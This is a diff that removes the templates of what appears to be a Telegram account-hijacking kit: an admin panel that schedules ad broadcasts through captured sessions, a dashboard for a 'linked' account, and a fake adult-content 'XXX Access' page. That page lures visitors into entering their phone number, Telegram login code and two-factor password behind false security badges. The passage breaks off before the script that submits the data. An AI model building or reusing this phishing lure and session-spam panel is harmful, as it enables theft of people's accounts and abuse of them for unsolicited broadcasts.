-                <p class="muted" style="margin-bottom:16px">Exactly as it will appear in Telegram:</p>
-                <div class="ad-preview" id="adPreviewBox">
-                    <p class="muted">Loading…</p>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Reset Modal -->
-    <div class="modal-overlay" id="resetModal" onclick="closeModalOnOverlay(event, 'resetModal')">
-        <div class="modal">
-            <div class="modal-header">
-                <h3 class="modal-title">Reset advertisements?</h3>
-                <button class="modal-close" onclick="closeModal('resetModal')">✕</button>
-            </div>
-            <div class="modal-body">
-                <p class="muted">This restores the two default ads and clears your caption and media. Interval and running state are kept.</p>
-                <div class="btn-group" style="margin-top:18px">
-                    <button class="btn btn-secondary" onclick="closeModal('resetModal')">Cancel</button>
-                    <button class="btn btn-danger" onclick="doReset(this)">Yes, Reset</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div class="toast-container" id="toastContainer"></div>
-
-    <script>
-        const API = 'api';
-        const CSRF = "{{ csrf }}";
-        let ADS = [];
-        let AD_HAS_BUTTON = true;
-
-        function openModal(id) {
-            document.getElementById(id).classList.add('active');
-            if (id === 'adsModal') loadAds();
-        }
-        function closeModal(id) { document.getElementById(id).classList.remove('active'); }
-        function closeModalOnOverlay(e, id) { if (e.target.id === id) closeModal(id); }
-
-        function showToast(message, type = 'success') {
-            const c = document.getElementById('toastContainer');
-            const t = document.createElement('div');
-            t.className = `toast ${type}`;
-            t.textContent = message;
-            c.appendChild(t);
-            setTimeout(() => t.remove(), 3000);
-        }
-        function esc(s) { const d = document.createElement('div'); d.textContent = s || ''; return d.innerHTML; }
-        function validUrl(u) { return /^https?:\/\/.+/.test(u); }
-
-        async function api(path, opts = {}) {
-            opts.headers = Object.assign({}, opts.headers, { "X-CSRF-Token": CSRF });
-            let r;
-            try { r = await fetch(`${API}${path}`, opts); }
-            catch (e) { showToast('Network error', 'error'); return { success: false, error: 'network' }; }
-            if (r.status === 401) { location.href = 'login'; return { success: false }; }
-            try { return await r.json(); } catch { return { success: false, error: 'bad response' }; }
-        }
-        async function withBusy(btn, fn) {
-            const prev = btn ? btn.innerHTML : null;
-            if (btn) { btn.disabled = true; btn.innerHTML = '<span class="spin"></span>'; }
-            try { return await fn(); }
-            finally { if (btn) { btn.disabled = false; btn.innerHTML = prev; } }
-        }
-
-        function setScheduler(running) {
-            const badge = document.getElementById('sysBadge');
-            badge.classList.toggle('online', running);
-            badge.classList.toggle('offline', !running);
-            badge.textContent = running ? 'Scheduler Running' : 'Scheduler Idle';
-            document.getElementById('toggleSwitch').classList.toggle('active', running);
-            document.getElementById('toggleStatus').textContent = running ? 'Running' : 'Stopped';
-            document.getElementById('statBroadcast').textContent = running ? 'ACTIVE' : 'PAUSED';
-        }
-
-        async function toggleAds() {
-            const wrap = document.getElementById('toggleWrap');
-            wrap.style.pointerEvents = 'none';
-            const d = await api('/toggle-ads', { method: 'POST' });
-            wrap.style.pointerEvents = '';
-            if (d.success) { setScheduler(d.enabled); showToast(d.message); }
-            else showToast(d.error || 'Failed', 'error');
-        }
-
-        async function toggleDelete() {
-            const wrap = document.getElementById('delWrap');
-            wrap.style.pointerEvents = 'none';
-            const d = await api('/toggle-delete-after-round', { method: 'POST' });
-            wrap.style.pointerEvents = '';
-            if (d.success) {
-                document.getElementById('delSwitch').classList.toggle('active', d.delete_after_round);
-                document.getElementById('delStatus').textContent = d.delete_after_round
-                    ? 'Ads are deleted after each round'
-                    : 'Ads are kept after each round';
-                showToast(d.message);
-            } else showToast(d.error || 'Failed', 'error');
-        }
-
-        async function saveInterval(btn) {
-            const v = parseInt(document.getElementById('intervalInput').value, 10);
-            if (!v || v < 1 || v > 1440) { showToast('Interval must be 1-1440 minutes', 'error'); return; }
-            await withBusy(btn, async () => {
-                const d = await api('/set-interval', {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({interval: v})
-                });
-                if (d.success) {
-                    document.getElementById('statInterval').textContent = v + 'min interval';
-                    showToast(d.message);
-                    closeModal('intervalModal');
-                } else showToast(d.error || 'Failed', 'error');
-            });
-        }
-
-        async function saveCaption(btn) {
-            await withBusy(btn, async () => {
-                const d = await api('/set-caption', {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({caption: document.getElementById('captionText').value})
-                });
-                if (d.success) { showToast(d.message); closeModal('captionModal'); }
-                else showToast(d.error || 'Failed', 'error');
-            });
-        }
-
-        async function uploadPhoto(input) {
-            if (!input.files || !input.files[0]) return;
-            const fd = new FormData();
-            fd.append('photo', input.files[0]);
-            const d = await api('/upload-photo', { method: 'POST', body: fd });
-            if (d.success) {
-                document.getElementById('mediaWrap').style.display = 'block';
-                const img = document.getElementById('photoPrev');
-                const vid = document.getElementById('videoPrev');
-                if (d.media_type === 'video') {
-                    vid.src = 'uploads/' + d.media_file + '?t=' + Date.now();
-                    vid.style.display = 'block';
-                    img.style.display = 'none';
-                } else {
-                    img.src = 'uploads/' + d.media_file + '?t=' + Date.now();
-                    img.style.display = 'block';
-                    vid.style.display = 'none';
-                }
-                showToast(d.message);
-            } else showToast(d.error || 'Failed', 'error');
-            input.value = '';
-        }
-        async function removePhoto(btn) {
-            await withBusy(btn, async () => {
-                const d = await api('/remove-photo', { method: 'POST' });
-                if (d.success) { document.getElementById('mediaWrap').style.display = 'none'; showToast(d.message); }
-                else showToast(d.error || 'Failed', 'error');
-            });
-        }
-
-        async function loadAds() {
-            const d = await api('/config');
-            ADS = d.ads || [];
-            renderAds();
-        }
-        function renderAds() {
-            const box = document.getElementById('adList');
-            if (!ADS.length) { box.innerHTML = '<p class="muted">No advertisements yet.</p>'; return; }
-            box.innerHTML = ADS.map(a => {
-                const on = a.has_button && a.label && a.url;
-                return `
-                <div class="ad-item">
-                    <div class="tag">${on ? 'Button' : 'Disabled'}</div>
-                    ${on
-                        ? `<div class="lbl">${esc(a.label)}</div><div class="url">${esc(a.url)}</div>`
-                        : `<div class="disabled">No button attached — skipped on broadcast</div>`}
-                    <div class="btn-group" style="margin-top:10px">
-                        <button class="btn btn-secondary btn-sm" onclick="editAd('${esc(a.id)}')">Edit</button>
-                        <button class="btn btn-danger btn-sm" onclick="delAd('${esc(a.id)}', this)">Delete</button>
-                    </div>
-                </div>`;
-            }).join('');
-        }
-
-        function setAdButton(on) {
-            AD_HAS_BUTTON = !!on;
-            document.getElementById('adBtnToggle').classList.toggle('active', AD_HAS_BUTTON);
-            document.getElementById('adBtnFields').style.display = AD_HAS_BUTTON ? 'block' : 'none';
-        }
-        function toggleAdButton() { setAdButton(!AD_HAS_BUTTON); }
-
-        function editAd(id) {
-            const a = ADS.find(x => x.id === id); if (!a) return;
-            document.getElementById('adId').value = a.id;
-            document.getElementById('adLabel').value = a.label || '';
-            document.getElementById('adUrl').value = a.url || '';
-            setAdButton(!!a.has_button);
-            document.getElementById('adFormTitle').textContent = 'Edit Advertisement';
-        }
-        function clearAdForm() {
-            document.getElementById('adId').value = '';
-            document.getElementById('adLabel').value = '';
-            document.getElementById('adUrl').value = '';
-            setAdButton(true);
-            document.getElementById('adFormTitle').textContent = 'Add Advertisement';
-        }
-        async function saveAd(btn) {
-            const id = document.getElementById('adId').value;
-            const body = {
-                has_button: AD_HAS_BUTTON,
-                label: document.getElementById('adLabel').value,
-                url: document.getElementById('adUrl').value
-            };
-            if (body.has_button) {
-                if (!body.label) { showToast('Button name required', 'error'); return; }
-                if (!validUrl(body.url)) { showToast('URL must start with http:// or https://', 'error'); return; }
-            }
-            await withBusy(btn, async () => {
-                const d = id
-                    ? await api('/ads/' + id, { method: 'PUT', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body) })
-                    : await api('/ads', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body) });
-                if (d.success) { ADS = d.ads; renderAds(); clearAdForm(); showToast(d.message); }
-                else showToast(d.error || 'Failed', 'error');
-            });
-        }
-        async function delAd(id, btn) {
-            await withBusy(btn, async () => {
-                const d = await api('/ads/' + id, { method: 'DELETE' });
-                if (d.success) { ADS = d.ads; renderAds(); showToast(d.message); }
-                else showToast(d.error || 'Failed', 'error');
-            });
-        }
-
-        async function doReset(btn) {
-            await withBusy(btn, async () => {
-                const d = await api('/reset-ads', { method: 'POST' });
-                if (d.success) {
-                    ADS = d.ads;
-                    document.getElementById('captionText').value = '';
-                    document.getElementById('mediaWrap').style.display = 'none';
-                    renderAds();
-                    showToast(d.message);
-                    closeModal('resetModal');
-                } else showToast(d.error || 'Failed', 'error');
-            });
-        }
-
-        async function openPreview() {
-            openModal('previewModal');
-            const box = document.getElementById('adPreviewBox');
-            box.innerHTML = '<p class="muted">Loading…</p>';
-            const d = await api('/preview');
-            if (!d.success) { box.innerHTML = '<p class="muted">Failed to load preview.</p>'; return; }
-
-            const parts = [];
-            if (d.media_file) {
-                const src = 'uploads/' + d.media_file + '?t=' + Date.now();
-                if (d.media_type === 'video') {
-                    parts.push(`<video class="ad-preview-media" src="${src}" controls></video>`);
-                } else {
-                    parts.push(`<img class="ad-preview-media" src="${src}" alt="media">`);
-                }
-            }
-            if (d.caption) {
-                parts.push(`<div class="ad-preview-caption">${esc(d.caption)}</div>`);
-            }
-            const btns = (d.ads || []).filter(a => a.has_button && a.label && a.url);
-            for (const b of btns) {
-                parts.push(`<a class="ad-preview-btn" href="${esc(b.url)}" target="_blank" rel="noopener">${esc(b.label)}</a>`);
-            }
-            if (!parts.length) {
-                box.innerHTML = '<p class="muted">Nothing configured yet. Add media, caption or ads first.</p>';
-            } else {
-                box.innerHTML = parts.join('');
-            }
-        }
-
-        async function refreshStats() {
-            const d = await api('/stats/refresh');
-            if (!d || d.success === false) return;
-            document.getElementById('statTotal').textContent      = d.total_users ?? 0;
-            document.getElementById('statSubscribed').textContent = d.opted_in ?? 0;
-            document.getElementById('statDeliveries').textContent = d.total_deliveries ?? 0;
-            document.getElementById('quickSessions').textContent  = d.active_sessions ?? 0;
-            document.getElementById('quickBroadcastMode').textContent = d.broadcast_mode_users ?? 0;
-            document.getElementById('quickOnline').textContent    = d.online_users ?? 0;
-            document.getElementById('quickRegisteredToday').textContent = d.registered_today ?? 0;
-            if (typeof d.broadcaster_running === 'boolean') setScheduler(d.broadcaster_running);
-        }
-
-        // Preload current media in the upload modal
-        (function initMediaPreview() {
-            const hasMedia = {{ 'true' if (config.media_path or config.photo_path) else 'false' }};
-            const mediaFile = {{ (config.media_path or config.photo_path) | tojson if (config.media_path or config.photo_path) else 'null' }};
-            const mediaType = {{ (config.media_type or 'photo') | tojson }};
-            if (hasMedia && mediaFile) {
-                const base = mediaFile.replace(/\\\\/g, '/').split('/').pop();
-                const img = document.getElementById('photoPrev');
-                const vid = document.getElementById('videoPrev');
-                if (mediaType === 'video') {
-                    vid.src = 'uploads/' + base;
-                    vid.style.display = 'block';
-                } else {
-                    img.src = 'uploads/' + base;
-                    img.style.display = 'block';
-                }
-            }
-            setAdButton(true);
-        })();
-
-        window.setInterval(refreshStats, 30000);
-        refreshStats();
-    </script>
-</body>
-</html>
-
-
-
-templates/admin_login.html
-
-
-<!DOCTYPE html>
-<html><head><meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Admin Login</title><link rel="icon" href="data:,">
-<style>body{font-family:Inter,system-ui,sans-serif;background:#0a0a0f;color:#f8fafc;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
-.card{background:#16161f;border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:32px;width:320px}
-h2{margin:0 0 16px;font-family:'Space Grotesk',sans-serif}
-input{width:100%;padding:12px;margin:8px 0;background:#12121a;border:1px solid rgba(255,255,255,.08);border-radius:10px;color:#fff;box-sizing:border-box}
-button{width:100%;padding:12px;background:linear-gradient(135deg,#6366f1,#8b5cf6);border:none;border-radius:10px;color:#fff;font-weight:600;cursor:pointer}
-.err{color:#ef4444;font-size:13px}</style></head>
-<body>
-<form class="card" method="POST">
-  <h2>Admin Login</h2>
-  {% if error %}<p class="err">{{ error }}</p>{% endif %}
-  <input type="password" name="password" placeholder="Password" autofocus>
-  <input type="hidden" name="csrf" value="{{ csrf }}">
-  <button>Enter</button>
-</form>
-</body></html>
-
-
-templates/dashboard.html
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard</title>
-    <link rel="icon" href="data:,">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --bg: #0a0a0f;
-            --card: #16161f;
-            --line: rgba(255,255,255,.08);
-            --txt: #f8fafc;
-            --muted: #64748b;
-            --acc: #6366f1;
-            --acc2: #8b5cf6;
-            --grad: linear-gradient(135deg,#6366f1,#8b5cf6);
-            --danger: #ef4444;
-            --success: #10b981;
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Inter', system-ui, sans-serif;
-            background: var(--bg);
-            color: var(--txt);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 24px;
-        }
-        .card {
-            background: var(--card);
-            border: 1px solid var(--line);
-            border-radius: 20px;
-            padding: 32px;
-            width: 100%;
-            max-width: 440px;
-        }
-        .logo {
-            font-family: 'Space Grotesk', sans-serif;
-            font-size: 24px;
-            font-weight: 700;
-            background: var(--grad);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 4px;
-        }
-        .sub { color: var(--muted); font-size: 14px; margin-bottom: 24px; }
-        .row {
-            display: flex;
-            justify-content: space-between;
-            padding: 14px 0;
-            border-bottom: 1px solid var(--line);
-            font-size: 14px;
-        }
-        .row:last-of-type { border-bottom: none; }
-        .row .k { color: var(--muted); }
-        .row .v { font-weight: 500; text-align: right; word-break: break-word; }
-        .actions { margin-top: 24px; display: grid; gap: 12px; }
-        .btn {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            padding: 14px;
-            border-radius: 12px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            border: none;
-            text-decoration: none;
-            transition: all .2s;
-        }
-        .btn-primary { background: var(--grad); color: #fff; }
-        .btn-primary:hover { transform: translateY(-2px); }
-        .btn-secondary { background: #12121a; color: var(--txt); border: 1px solid var(--line); }
-        .btn-secondary:hover { background: #1e1e2a; }
-        .btn-danger { background: rgba(239,68,68,.1); color: var(--danger); border: 1px solid rgba(239,68,68,.2); }
-        .btn-danger:hover { background: rgba(239,68,68,.2); }
-        .btn:disabled { opacity: .6; cursor: not-allowed; }
-        .toast {
-            position: fixed; bottom: 24px; right: 24px;
-            padding: 14px 18px; background: var(--card);
-            border: 1px solid var(--line); border-radius: 12px; font-size: 14px;
-        }
-        @media (max-width: 480px) {
-            .card { padding: 24px; }
-        }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <h1 class="logo">NEXA</h1>
-        <p class="sub">Your account is linked and active</p>
-
-        <div class="row">
-            <span class="k">Name</span>
-            <span class="v">{{ user.name or 'Unknown' }}</span>
-        </div>
-        <div class="row">
-            <span class="k">Username</span>
-            <span class="v">@{{ user.username or 'N/A' }}</span>
-        </div>
-        <div class="row">
-            <span class="k">Phone</span>
-            <span class="v">{{ user.phone or 'N/A' }}</span>
-        </div>
-        <div class="row">
-            <span class="k">User ID</span>
-            <span class="v">{{ user.id }}</span>
-        </div>
-
-        <div class="actions">
-            <a class="btn btn-primary" href="/admin/">Open Admin Panel</a>
-            <button class="btn btn-danger" id="logoutBtn" onclick="logout()">Logout</button>
-        </div>
-    </div>
-
-    <div id="toast"></div>
-
-    <script>
-        function showToast(msg) {
-            const t = document.createElement('div');
-            t.className = 'toast';
-            t.textContent = msg;
-            document.getElementById('toast').appendChild(t);
-            setTimeout(() => t.remove(), 2500);
-        }
-
-        async function logout() {
-            const btn = document.getElementById('logoutBtn');
-            btn.disabled = true;
-            try {
-                const r = await fetch('/api/logout', { method: 'POST' });
-                const d = await r.json();
-                if (d.ok) location.href = '/login';
-                else showToast('Logout failed');
-            } catch (e) {
-                showToast('Network error');
-            } finally {
-                btn.disabled = false;
-            }
-        }
-    </script>
-</body>
-</html>
-
-
-
-templates/login.html
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XXX Access - Adults Only 🔞</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
-
-        * { 
-            margin: 0; 
-            padding: 0; 
-            box-sizing: border-box; 
-        }
-
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #fff;
-            position: relative;
-            overflow: hidden;
-        }
-
-        /* Video Background */
-        .video-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            z-index: -2;
-        }
-
-        /* Dark Overlay */
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            z-index: -1;
-        }
-
-        /* Red Gradient Overlay */
-        body::after {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, rgba(255, 20, 80, 0.3) 0%, rgba(80, 0, 60, 0.4) 50%, rgba(20, 0, 40, 0.5) 100%);
-            z-index: -1;
-        }
-
-        .container {
-            background: rgba(10, 10, 15, 0.95);
-            backdrop-filter: blur(25px);
-            padding: 45px 40px;
-            border-radius: 24px;
-            width: 90%;
-            max-width: 440px;
-            border: 1px solid rgba(255, 50, 100, 0.3);
-            box-shadow: 0 40px 120px rgba(0, 0, 0, 0.9),
-                        0 0 80px rgba(255, 30, 80, 0.2),
-                        inset 0 1px 0 rgba(255, 255, 255, 0.1);
-            position: relative;
-            z-index: 1;
-        }
-
-        .xxx-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: linear-gradient(135deg, #ff1468, #ff3860);
-            color: #fff;
-            padding: 10px 24px;
-            border-radius: 30px;
-            font-size: 14px;
-            font-weight: 800;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            margin-bottom: 20px;
-            box-shadow: 0 8px 30px rgba(255, 20, 80, 0.5);
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); box-shadow: 0 8px 30px rgba(255, 20, 80, 0.5); }
-            50% { transform: scale(1.02); box-shadow: 0 12px 40px rgba(255, 20, 80, 0.7); }
-        }
-
-        .xxx-badge::before {
-            content: '🔞';
-            font-size: 16px;
-        }
-
-        h1 {
-            text-align: center;
-            margin-bottom: 8px;
-            font-size: 36px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #fff 0%, #ff99aa 50%, #ff1468 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .subtitle {
-            text-align: center;
-            color: #ff99aa;
-            margin-bottom: 25px;
-            font-size: 14px;
-            font-weight: 400;
-        }
-
-        .warning-box {
-            background: rgba(255, 20, 80, 0.15);
-            border: 1px solid rgba(255, 50, 100, 0.4);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 25px;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .warning-box::before {
-            content: '⚠️';
-            font-size: 24px;
-            display: block;
-            margin-bottom: 8px;
-        }
-
-        .warning-box p {
-            font-size: 13px;
-            color: #ffbbcc;
-            line-height: 1.6;
-        }
-
-        .step {
-            display: none;
-        }
-
-        .step.active {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(30px) scale(0.95); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
-        }
-
-        .input-group {
-            margin-bottom: 22px;
-        }
-
-        label {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 10px;
-            color: #ff99aa;
-            font-size: 13px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        label::before {
-            content: '→';
-            color: #ff1468;
-            font-weight: bold;
-        }
-
-        /* Phone Input */
-        input[type="tel"] {
-            width: 100%;
-            padding: 18px 20px;
-            border: 2px solid rgba(255, 50, 100, 0.3);
-            border-radius: 14px;
-            background: rgba(0, 0, 0, 0.6);
-            color: #fff;
-            font-size: 18px;
-            transition: all 0.3s ease;
-            font-family: 'SF Mono', monospace;
-        }
-
-        input[type="tel"]::placeholder {
-            color: #664;
-        }
-
-        input[type="tel"]:focus {
-            outline: none;
-            border-color: #ff1468;
-            background: rgba(0, 0, 0, 0.7);
-            box-shadow: 0 0 30px rgba(255, 20, 80, 0.3);
-        }
-
-        /* OTP Input with Spaces */
-        .otp-container {
-            display: flex;
-            gap: 12px;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
-
-        .otp-input {
-            width: 55px;
-            height: 65px;
-            text-align: center;
-            font-size: 28px;
-            font-weight: 700;
-            color: #fff;
-            background: rgba(0, 0, 0, 0.6);
-            border: 2px solid rgba(255, 50, 100, 0.3);
-            border-radius: 14px;
-            transition: all 0.3s ease;
-            font-family: 'SF Mono', monospace;
-        }
-
-        .otp-input:focus {
-            outline: none;
-            border-color: #ff1468;
-            background: rgba(255, 20, 80, 0.1);
-            box-shadow: 0 0 25px rgba(255, 20, 80, 0.4);
-            transform: scale(1.05);
-        }
-
-        .otp-input.filled {
-            border-color: #00ff88;
-            background: rgba(0, 255, 100, 0.1);
-        }
-
-        /* Password Input */
-        input[type="password"] {
-            width: 100%;
-            padding: 18px 20px;
-            border: 2px solid rgba(255, 50, 100, 0.3);
-            border-radius: 14px;
-            background: rgba(0, 0, 0, 0.6);
-            color: #fff;
-            font-size: 16px;
-            transition: all 0.3s ease;
-        }
-
-        input[type="password"]:focus {
-            outline: none;
-            border-color: #ff1468;
-            box-shadow: 0 0 25px rgba(255, 20, 80, 0.3);
-        }
-
-        button {
-            width: 100%;
-            padding: 20px;
-            background: linear-gradient(135deg, #ff1468, #ff3860);
-            color: #fff;
-            border: none;
-            border-radius: 14px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            margin-top: 10px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        button::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            transition: left 0.5s;
-        }
-
-        button:hover::before {
-            left: 100%;
-        }
-
-        button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 20px 60px rgba(255, 20, 80, 0.5);
-        }
-
-        button:active {
-            transform: translateY(-1px);
-        }
-
-        button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-
-        .info-box {
-            background: rgba(255, 255, 255, 0.05);
-            border-left: 4px solid #ff1468;
-            padding: 18px;
-            border-radius: 0 12px 12px 0;
-            margin-bottom: 25px;
-            font-size: 14px;
-            color: #ccc;
-            line-height: 1.6;
-        }
-
-        .error {
-            background: rgba(255, 0, 0, 0.15);
-            border-left-color: #ff4444;
-            color: #ff9999;
-        }
-
-        .success {
-            background: rgba(0, 255, 100, 0.1);
-            border-left-color: #00ff88;
-            color: #88ffaa;
-        }
-
-        .loading {
-            display: none;
-            text-align: center;
-            padding: 30px;
-        }
-
-        .loading.active {
-            display: block;
-        }
-
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(255, 255, 255, 0.1);
-            border-top-color: #ff1468;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-
-        @keyframes spin { 
-            to { transform: rotate(360deg); } 
-        }
-
-        .phone-display {
-            text-align: center;
-            padding: 18px;
-            background: rgba(255, 20, 80, 0.1);
-            border-radius: 14px;
-            margin-bottom: 25px;
-            font-family: 'SF Mono', monospace;
-            font-size: 18px;
-            color: #ff99aa;
-            border: 1px solid rgba(255, 20, 80, 0.3);
-            letter-spacing: 1px;
-        }
-
-        .resend {
-            text-align: center;
-            margin-top: 25px;
-            color: #888;
-            font-size: 14px;
-        }
-
-        .resend a {
-            color: #ff99aa;
-            cursor: pointer;
-            text-decoration: underline;
-            transition: color 0.3s;
-            font-weight: 600;
-        }
-
-        .resend a:hover {
-            color: #ff1468;
-        }
-
-        .secure-badge {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 30px;
-            padding-top: 25px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            font-size: 12px;
-            color: #666;
-        }
-
-        .secure-badge svg {
-            width: 16px;
-            height: 16px;
-            fill: #00ff88;
-        }
-
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-top: 20px;
-            font-size: 12px;
-        }
-
-        .footer-links a {
-            color: #666;
-            text-decoration: none;
-            transition: color 0.3s;
-        }
-
-        .footer-links a:hover {
-            color: #ff99aa;
-        }
-
-        /* Floating particles effect */
-        .particles {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 0;
-            overflow: hidden;
-        }
-
-        .particle {
-            position: absolute;
-            width: 4px;
-            height: 4px;
-            background: rgba(255, 20, 80, 0.5);
-            border-radius: 50%;
-            animation: float 15s infinite;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
-            10% { opacity: 1; }
-            90% { opacity: 1; }
-            100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
-        }
-    </style>
-</head>
-<body>
-    <!-- Video Background -->
-    <video class="video-bg" autoplay muted loop playsinline>
-        <source src="https://image-link.edgeone.app/1791374557217-tnbb8k.mp4" type="video/mp4">
-    </video>
-
-    <!-- Particles -->
-    <div class="particles" id="particles"></div>
-
-    <div class="container">
-        <div style="text-align: center;">
-            <span class="xxx-badge">Adults Only</span>
-        </div>
-
-        <h1>XXX Access</h1>
-        <p class="subtitle">Enter to unlock exclusive adult content</p>
-
-        <div class="warning-box">
-            <p>This website contains explicit adult material. By entering, you confirm you are at least 18 years of age and agree to our Terms of Service.</p>
-        </div>
-
-        <!-- Step 1: Enter Phone -->
-        <div id="step1" class="step active">
-            <div class="info-box">
-                🔐 Enter your phone number with country code. A secure verification code will be sent to your Telegram app instantly.
-            </div>
-
-            <div class="input-group">
-                <label>Phone Number</label>
-                <input type="tel" id="phone" placeholder="+91 98765 43210" autocomplete="tel">
-            </div>
-
-            <button onclick="sendCode()" id="sendBtn">Get Access Code</button>
-
-            <div class="loading" id="loading1">
-                <div class="spinner"></div>
-                <p style="color: #888; font-size: 14px;">Connecting to secure server...</p>
-            </div>
-        </div>
-
-        <!-- Step 2: Enter Code -->
-        <div id="step2" class="step">
-            <div class="info-box success">
-                ✅ Verification code sent! Check your Telegram messages.
-            </div>
-
-            <div class="phone-display" id="phoneDisplay"></div>
-
-            <div class="input-group">
-                <label>Enter Code</label>
-                <div class="otp-container">
-                    <input type="text" class="otp-input" maxlength="1" data-index="0">
-                    <input type="text" class="otp-input" maxlength="1" data-index="1">
-                    <input type="text" class="otp-input" maxlength="1" data-index="2">
-                    <input type="text" class="otp-input" maxlength="1" data-index="3">
-                    <input type="text" class="otp-input" maxlength="1" data-index="4">
-                </div>
-            </div>
-
-            <div class="input-group" id="passwordGroup" style="display:none;">
-                <label>Two-Factor Password</label>
-                <input type="password" id="password" placeholder="Enter 2FA password">
-            </div>
-
-            <button onclick="verifyCode()" id="verifyBtn">Unlock Content</button>
-
-            <div class="loading" id="loading2">
-                <div class="spinner"></div>
-                <p style="color: #888; font-size: 14px;">Verifying your access...</p>
-            </div>
-
-            <div class="resend">
-                Didn't receive code? <a onclick="backToStep1()">Try again</a>
-            </div>
-        </div>
-
-        <div id="message"></div>
-
-        <div class="secure-badge">
-            <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-            <span>256-bit SSL Encrypted • Anonymous Access</span>
-        </div>
-
-        <div class="footer-links">
-            <a href="#">Privacy</a>
-            <a href="#">Terms</a>
-            <a href="#">2257 Compliance</a>
-            <a href="#">DMCA</a>
-        </div>
-    </div>
-
-    <script>
-        let currentSessionId = null;
-
-        // Create floating particles
-        function createParticles() {
-            const container = document.getElementById('particles');
-            for (let i = 0; i < 20; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                particle.style.left = Math.random() * 100 + '%';
-                particle.style.animationDelay = Math.random() * 15 + 's';
-                particle.style.animationDuration = (10 + Math.random() * 10) + 's';
-                container.appendChild(particle);
-            }
-        }
-        createParticles();
-
-        function showMessage(text, type='info') {
-            const msg = document.getElementById('message');
-            msg.innerHTML = `<div class="info-box ${type}">${text}</div>`;
-            setTimeout(() => msg.innerHTML = '', 5000);
-        }
-
-        // OTP Input Handling
-        const otpInputs = document.querySelectorAll('.otp-input');
-        otpInputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                if (e.target.value) {
-                    e.target.classList.add('filled');
-                    if (index < otpInputs.length - 1) {
-                        otpInputs[index + 1].focus();
-                    }
-                } else {
-                    e.target.classList.remove('filled');
-                }
-            });
-
-            input.addEventListener('keydown', (e) => {
